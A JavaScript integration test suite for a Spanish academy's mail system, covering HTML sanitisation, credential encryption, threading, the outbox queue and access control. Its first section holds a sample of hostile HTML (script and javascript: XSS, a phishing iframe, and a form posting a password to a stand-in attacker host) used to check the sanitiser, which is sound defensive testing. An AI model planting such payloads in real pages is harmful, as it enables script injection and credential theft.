import fs from 'fs';
import path from 'path';
import pool, { query } from '../db.js';
import {
  sanitizeEmailHtml, encryptAccountSecret, decryptAccountSecret,
  queueOutboundReply, processOutboxQueue
} from '../mailEngine.js';
import { hashPassword, generateToken, hashToken } from '../authUtils.js';

const BASE_URL = 'http://localhost:3000';

async function runMailSystemTests() {
  console.log('--- STARTING MAIL SYSTEM INTEGRATION & SECURITY TEST SUITE ---');
  let passed = 0;
  let failed = 0;

  function assert(condition, message) {
    if (condition) {
      console.log(`  ✅ PASS: ${message}`);
      passed++;
    } else {
      console.error(`  ❌ FAIL: ${message}`);
      failed++;
    }
  }

  try {
    // 1. TEST HTML SANITIZATION & SECURITY VECTORS
    console.log('\n--- 1. HTML SANITIZATION SECURITY TEST ---');
    const maliciousHtml = `
      <div>
        <p>Estimados señores,</p>
        <script>alert('MALWARE EXECUTION')</script>
        <iframe src="http://evilsite.com/phish"></iframe>
        <form action="http://evilsite.com/steal" method="POST">
          <input type="password" name="pass" value="secret" />
          <button type="submit" onclick="alert('click')">Submit</button>
        </form>
        <img src="http://tracking-pixel.com/track.gif" alt="Pixel" />
        <a href="javascript:alert('xss')">Haz clic aquí</a>
      </div>
    `;

    const sanitized = sanitizeEmailHtml(maliciousHtml);
    assert(!sanitized.includes('<script>'), 'Blocked <script> tag');
    assert(!sanitized.includes('alert('), 'Blocked script execution content');
    assert(!sanitized.includes('<iframe'), 'Blocked <iframe> tag');
    assert(!sanitized.includes('<form'), 'Blocked <form> tag');
    assert(!sanitized.includes('<input'), 'Blocked <input> fields');
    assert(!sanitized.includes('onclick='), 'Blocked inline event handlers');
    assert(sanitized.includes('data-blocked-src="http://tracking-pixel.com/track.gif"'), 'Blocked remote tracking pixel image src');
    assert(!sanitized.includes('href="javascript:'), 'Blocked javascript: URI scheme in href');

    // 2. TEST CREDENTIAL AES-256-GCM ENCRYPTION
    console.log('\n--- 2. CREDENTIAL AES-256-GCM ENCRYPTION TEST ---');
    const rawSecret = 'Hostinger_Mail_Secret_Password_2026!';
    const encryptedSecret = encryptAccountSecret(rawSecret);
    const decryptedSecret = decryptAccountSecret(encryptedSecret);

    assert(encryptedSecret !== rawSecret, 'Password is not stored in plaintext');
    assert(!encryptedSecret.includes(rawSecret), 'Encrypted string hides raw password');
    assert(decryptedSecret === rawSecret, 'Decrypted secret matches original raw secret');

    // Fetch real Admin User ID
    const adminUser = await query(`SELECT id FROM usuarios WHERE email = 'admin@academiaspendulo.com' LIMIT 1`);
    const realAdminId = adminUser.length > 0 ? adminUser[0].id : null;

    // 3. TEST DATABASE MAILBOX ACCOUNT CONFIGURATION
    console.log('\n--- 3. MAILBOX ACCOUNT DB CONFIGURATION TEST ---');
    const testAccountId = `test_acc_${Date.now()}`;
    const testBuzon = `secretaria_test_${Date.now()}@academiaspendulo.com`;

    await query(`
      INSERT INTO cuentas_correo (id, buzon, proveedor, estado, secreto_ref, configuracion, creado_en)
      VALUES (?, ?, 'Hostinger IMAP/SMTP', 'ACTIVA', ?, ?, NOW())
    `, [
      testAccountId,
      testBuzon,
      encryptedSecret,
      JSON.stringify({ imap_host: 'mail.hostinger.com', imap_port: 993, smtp_host: 'smtp.hostinger.com', smtp_port: 465, sync_interval_minutes: 5 })
    ]);

    const accRows = await query(`SELECT * FROM cuentas_correo WHERE id = ?`, [testAccountId]);
    assert(accRows.length === 1, 'Mailbox account inserted successfully');
    assert(accRows[0].buzon === testBuzon, 'Mailbox email address matches');

    // Initialize checkpoint
    await query(`
      INSERT INTO sincronizacion_correo (cuenta_id, carpeta, uidvalidity, uid_next, last_uid, fecha_sincronizacion)
      VALUES (?, 'INBOX', 12345, 10, 9, NOW())
    `, [testAccountId]);

    const syncRows = await query(`SELECT * FROM sincronizacion_correo WHERE cuenta_id = ? AND carpeta = 'INBOX'`, [testAccountId]);
    assert(syncRows.length === 1 && syncRows[0].uidvalidity === 12345, 'Sync checkpoint row created with UIDVALIDITY');

    // 4. TEST THREAD GROUPING & DEDUPLICATION IN DB
    console.log('\n--- 4. THREAD GROUPING & DEDUPLICATION TEST ---');
    const testThreadId = `th_test_${Date.now()}`;
    const msg1Id = `<msg1.${Date.now()}@external.com>`;
    const msg2Id = `<msg2.${Date.now()}@external.com>`;

    await query(`
      INSERT INTO hilos_correo (id, cuenta_id, asunto_hilo, creado_en, actualizado_en)
      VALUES (?, ?, 'Consulta sobre curso TMVG0002', NOW(), NOW())
    `, [testThreadId, testAccountId]);

    const correo1Id = `msg_${Date.now()}_1`;
    await query(`
      INSERT INTO correos 
      (id, cuenta_id, hilo_id, provider_id, message_id, remitente, destinatarios, asunto, cuerpo_texto, cuerpo_html, fecha_correo, direccion, creado_en)
      VALUES (?, ?, ?, ?, ?, 'Juan Pérez <juan.perez@gmail.com>', '["${testBuzon}"]', 'Consulta sobre curso TMVG0002', 'Hola, quisiera información sobre el curso.', '<p>Hola, quisiera información sobre el curso.</p>', NOW(), 'INBOUND', NOW())
    `, [correo1Id, testAccountId, testThreadId, 'imap_12345_1', msg1Id]);

    // Insert reply message with In-Reply-To matching msg1Id
    const correo2Id = `msg_${Date.now()}_2`;
    await query(`
      INSERT INTO correos 
      (id, cuenta_id, hilo_id, provider_id, message_id, in_reply_to, references_header, remitente, destinatarios, asunto, cuerpo_texto, cuerpo_html, fecha_correo, direccion, creado_en)
      VALUES (?, ?, ?, ?, ?, ?, ?, 'Juan Pérez <juan.perez@gmail.com>', '["${testBuzon}"]', 'Re: Consulta sobre curso TMVG0002', 'Tienen plazas disponibles?', '<p>Tienen plazas disponibles?</p>', NOW(), 'INBOUND', NOW())
    `, [correo2Id, testAccountId, testThreadId, 'imap_12345_2', msg2Id, msg1Id, msg1Id]);

    const threadMsgs = await query(`SELECT * FROM correos WHERE hilo_id = ? ORDER BY fecha_correo ASC`, [testThreadId]);
    assert(threadMsgs.length === 2, 'Thread correctly grouped both inbound messages by In-Reply-To header');

    // Deduplication check
    const dedupCheck = await query(`SELECT id FROM correos WHERE cuenta_id = ? AND (provider_id = 'imap_12345_1' OR message_id = ?)`, [testAccountId, msg1Id]);
    assert(dedupCheck.length === 1 && dedupCheck[0].id === correo1Id, 'Deduplication query correctly identifies pre-existing email');

    // 5. TEST OUTBOX QUEUE & IDEMPOTENCY KEY GENERATION
    console.log('\n--- 5. OUTBOX QUEUE & IDEMPOTENCY TEST ---');
    const queueResult = await queueOutboundReply({
      cuentaId: testAccountId,
      hiloId: testThreadId,
      remitenteId: realAdminId,
      destinatarios: ['juan.perez@gmail.com'],
      asunto: 'Re: Consulta sobre curso TMVG0002',
      cuerpoTexto: 'Estimado Juan, sí tenemos plazas disponibles.',
      cuerpoHtml: '<p>Estimado Juan, sí tenemos plazas disponibles.</p>',
      inReplyTo: msg2Id,
      referencesHeader: `${msg1Id} ${msg2Id}`
    });

    assert(queueResult.status === 'QUEUED', 'Outbound reply placed in outbox queue');
    assert(queueResult.outboxId && queueResult.messageId, 'Outbox ID and Message-ID generated');

    const outboxRows = await query(`SELECT * FROM cola_correos WHERE id = ?`, [queueResult.outboxId]);
    assert(outboxRows.length === 1, 'Record exists in cola_correos');
    assert(outboxRows[0].estado === 'PENDIENTE', 'Initial status is PENDIENTE');
    assert(outboxRows[0].clave_idempotencia.length === 64, 'SHA-256 idempotency key generated');

    // 6. TEST ATTACHMENT STORAGE & ROLE-BASED DOWNLOAD SECURITY
    console.log('\n--- 6. ATTACHMENT PRIVACY & AUTHORIZATION TEST ---');
    const attachmentFileId = `arc_test_${Date.now()}`;
    const testAttachmentFilename = `test_doc_${Date.now()}.pdf`;
    const testAttachmentPath = path.join('uploads', 'private', testAttachmentFilename);
    const fullAttachmentPath = path.join(process.cwd(), testAttachmentPath);

    // Create physical dummy PDF file in private uploads
    if (!fs.existsSync(path.dirname(fullAttachmentPath))) {
      fs.mkdirSync(path.dirname(fullAttachmentPath), { recursive: true });
    }
    fs.writeFileSync(fullAttachmentPath, '%PDF-1.4 Dummy Test PDF Content');

    await query(`
      INSERT INTO archivos (id, clave_almacenamiento, nombre_original, mime_type, tamano_bytes, autor_id, creado_en)
      VALUES (?, ?, 'Certificado_Prueba.pdf', 'application/pdf', 1024, ?, NOW())
    `, [attachmentFileId, testAttachmentFilename, realAdminId]);

    await query(`
      INSERT INTO correo_archivos (correo_id, archivo_id)
      VALUES (?, ?)
    `, [correo1Id, attachmentFileId]);

    const mailAttCheck = await query(`SELECT * FROM correo_archivos WHERE archivo_id = ?`, [attachmentFileId]);
    assert(mailAttCheck.length === 1, 'Attachment linked to mail record in correo_archivos');

    // Generate session token directly in DB for Admin (bypassing rate limiter)
    const adminToken = generateToken(32);
    const adminTokenHash = hashToken(adminToken);
    const adminSessionId = `ses_admin_${Date.now()}`;
    await query(`
      INSERT INTO sesiones (id, usuario_id, token_hash, expiracion, creado_en)
      VALUES (?, ?, ?, DATE_ADD(NOW(), INTERVAL 1 HOUR), NOW())
    `, [adminSessionId, realAdminId, adminTokenHash]);
    const adminHeaders = { 'cookie': `campus_session=${adminToken}` };

    // Create student account & session for auth check
    const studentTestEmail = `alumno_sec_test_${Date.now()}@pendulo.com`;
    const tempPassHash = await hashPassword('AlumnoPass123!');
    const studentUserId = `usr_stud_${Date.now()}`;

    await query(`
      INSERT INTO usuarios (id, nombre, apellidos, email, email_original, password_hash, estado, cambio_password_obligatorio, creado_en)
      VALUES (?, 'Alumno', 'Prueba Security', ?, ?, ?, 'ACTIVO', 0, NOW())
    `, [studentUserId, studentTestEmail, studentTestEmail, tempPassHash]);

    await query(`
      INSERT INTO usuario_roles (usuario_id, rol_id)
      SELECT ?, id FROM roles WHERE nombre = 'ALUMNO'
    `, [studentUserId]);

    const studentToken = generateToken(32);
    const studentTokenHash = hashToken(studentToken);
    const studentSessionId = `ses_stud_${Date.now()}`;
    await query(`
      INSERT INTO sesiones (id, usuario_id, token_hash, expiracion, creado_en)
      VALUES (?, ?, ?, DATE_ADD(NOW(), INTERVAL 1 HOUR), NOW())
    `, [studentSessionId, studentUserId, studentTokenHash]);
    const studentHeaders = { 'cookie': `campus_session=${studentToken}` };

    // Student tries to download mail attachment -> Must get 403 Forbidden
    const studentDlRes = await fetch(`${BASE_URL}/api/files/${attachmentFileId}/download`, { headers: studentHeaders });
    assert(studentDlRes.status === 403, 'Student attempt to download corporate email attachment rejected with HTTP 403 Forbidden');

    // Admin tries to download mail attachment -> Must get 200 OK
    const adminDlRes = await fetch(`${BASE_URL}/api/files/${attachmentFileId}/download`, { headers: adminHeaders });
    assert(adminDlRes.status === 200, 'Admin download of corporate email attachment allowed with HTTP 200 OK');

    // Admin tries to fetch threads API -> Must get 200 OK
    const adminThreadsRes = await fetch(`${BASE_URL}/api/admin/mail/threads`, { headers: adminHeaders });
    assert(adminThreadsRes.status === 200, 'Admin access to /api/admin/mail/threads allowed with HTTP 200 OK');

    // Student tries to fetch threads API -> Must get 403 Forbidden
    const studentThreadsRes = await fetch(`${BASE_URL}/api/admin/mail/threads`, { headers: studentHeaders });
    assert(studentThreadsRes.status === 403, 'Student access to /api/admin/mail/threads rejected with HTTP 403 Forbidden');

    // 7. TEST EXPLICIT LEAD CONVERSION API
    console.log('\n--- 7. EXPLICIT ADMIN LEAD CONVERSION TEST ---');
    const convertRes = await fetch(`${BASE_URL}/api/admin/mail/leads/convert`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json', ...adminHeaders },
      body: JSON.stringify({
        email: 'juan.perez@gmail.com',
        nombre: 'Juan',
        apellidos: 'Pérez',
        mensaje: 'Convertido desde correo'
      })
    });

    const convertData = await convertRes.json();
    assert(convertRes.status === 201 && convertData.success, 'Explicit admin action created contact request lead without auto-enrolling student');

    const leadId = convertData.leadId;
    assert(Boolean(leadId), 'Lead ID returned from endpoint');
    if (leadId) {
      const leadRows = await query(`SELECT * FROM solicitudes WHERE id = ?`, [leadId]);
      assert(leadRows.length === 1 && leadRows[0].tipo === 'OTRO', 'Lead request record stored in solicitudes table');

      const convRows = await query(`SELECT * FROM conversaciones WHERE id = ?`, [leadRows[0].conversacion_id]);
      assert(convRows.length === 1 && convRows[0].tipo === 'SOLICITUD', 'Linked conversation stored in conversaciones table');

      // Cleanup request & conversation
      await query(`DELETE FROM solicitudes WHERE id = ?`, [leadId]);
      if (leadRows.length > 0) {
        await query(`DELETE FROM mensajes WHERE conversacion_id = ?`, [leadRows[0].conversacion_id]);
        await query(`DELETE FROM conversaciones WHERE id = ?`, [leadRows[0].conversacion_id]);
      }
    }

    // Cleanup test data
    console.log('\n--- CLEANING UP TEST ARTIFACTS ---');
    await query(`DELETE FROM sesiones WHERE id IN (?, ?)`, [adminSessionId, studentSessionId]);
    await query(`DELETE FROM usuario_roles WHERE usuario_id = ?`, [studentUserId]);
    await query(`DELETE FROM usuarios WHERE id = ?`, [studentUserId]);
    await query(`DELETE FROM cola_correos WHERE id = ?`, [queueResult.outboxId]);
    await query(`DELETE FROM correo_archivos WHERE archivo_id = ?`, [attachmentFileId]);
    await query(`DELETE FROM archivos WHERE id = ?`, [attachmentFileId]);
    await query(`DELETE FROM correos WHERE cuenta_id = ?`, [testAccountId]);
    await query(`DELETE FROM hilos_correo WHERE id = ?`, [testThreadId]);
    await query(`DELETE FROM sincronizacion_correo WHERE cuenta_id = ?`, [testAccountId]);
    await query(`DELETE FROM cuentas_correo WHERE id = ?`, [testAccountId]);
    if (fs.existsSync(fullAttachmentPath)) fs.unlinkSync(fullAttachmentPath);
    console.log('  Cleaned up all temporary test records and files.');

  } catch (err) {
    console.error('CRITICAL ERROR DURING MAIL TEST RUN:', err);
    failed++;
  } finally {
    console.log(`\n==================================================`);
    console.log(`MAIL SYSTEM TEST RESULTS: ${passed} PASSED, ${failed} FAILED`);
    console.log(`==================================================`);
    pool.end();
  }
}

runMailSystemTests();
